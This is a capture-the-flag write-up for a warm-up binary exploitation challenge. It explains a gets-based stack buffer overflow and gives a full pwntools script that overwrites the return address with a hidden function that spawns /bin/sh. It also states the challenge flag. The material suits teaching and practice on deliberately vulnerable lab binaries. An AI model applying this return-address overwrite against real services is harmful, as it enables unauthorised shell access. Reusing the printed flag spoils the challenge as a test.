# l33t club

**`Author:`** [LaidMalik](https://github.com/malikDaCoda)

## Description

> Welcome Pwn3R!! We have prepared this challenge to warm you up for what's coming next ;)

## Write-up

### Brief Summary

- `gets` function is used --> buffer overflow
- there is a `secret` function, after analyzing it we understand it makes an `execve` syscall to open a shell: `execve(filename="/bin/sh", argv=0, envp=0)`
- overflow the buffer to overwrite the return address with the `secret` function's address
- pop a shell :)

### TODO

### Solve script

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF("./challenge/welcome")

HOST, PORT = "localhost", 1337

context.binary = elf
context.terminal = ["tmux", "splitw", "-h", "-p", "75"]

def main():
    global io

    # offset from return address
    offset = 0x48

    io = conn()

    io.recvuntil(": ")
    payload = flat(
        b'A'*offset,
        elf.sym.secret
    )
    io.sendline(payload)

    io.interactive()

def conn():
    global libc
    gdbscript = '''
    '''
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        p = process([elf.path])
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
        return p

if __name__ == "__main__":
    io = None
    try:
        main()
    finally:
        if io:
            io.close()

```

### Flag

`shellmates{g000d_s7@rt_Pwn3R_U_c4n_c0Nt1Nu3!!}`
